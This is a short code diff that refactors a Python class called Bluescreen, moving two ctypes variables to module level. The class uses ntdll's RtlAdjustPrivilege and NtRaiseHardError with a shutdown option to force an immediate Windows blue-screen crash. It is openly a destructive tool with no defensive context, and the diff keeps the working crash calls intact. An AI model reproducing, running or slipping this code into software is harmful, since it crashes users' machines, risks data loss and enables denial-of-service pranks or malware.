@@ -5,6 +5,9 @@ OPTION_SHUTDOWN = 6
 SHUTDOWN_PRIVILEGE = 19
 STATUS_NOT_IMPLEMENTED = 0xC0000002
 
+ENABLED = BOOL()
+RESPONSE = ULONG()
+
 class Bluescreen:
     def __init__(self):
         self.ntdll = ctypes.WinDLL('ntdll.dll')
@@ -12,16 +15,13 @@ class Bluescreen:
         self._NtRaiseHardError = self.ntdll.NtRaiseHardError
         self._RtlAdjustPrivilege = self.ntdll.RtlAdjustPrivilege
 
-        self.ENABLED = BOOL()
-        self.RESPONSE = ULONG()
-
     def bsod(self):
         if self._RtlAdjustPrivilege(
             SHUTDOWN_PRIVILEGE,
             True,
             True,
             ctypes.byref(
-                self.ENABLED
+                ENABLED
             )
         ):
             self._NtRaiseHardError(
@@ -30,7 +30,7 @@ class Bluescreen:
                 0,
                 0,
                 ctypes.byref(
-                    self.RESPONSE
+                    RESPONSE
                 )
             )
 
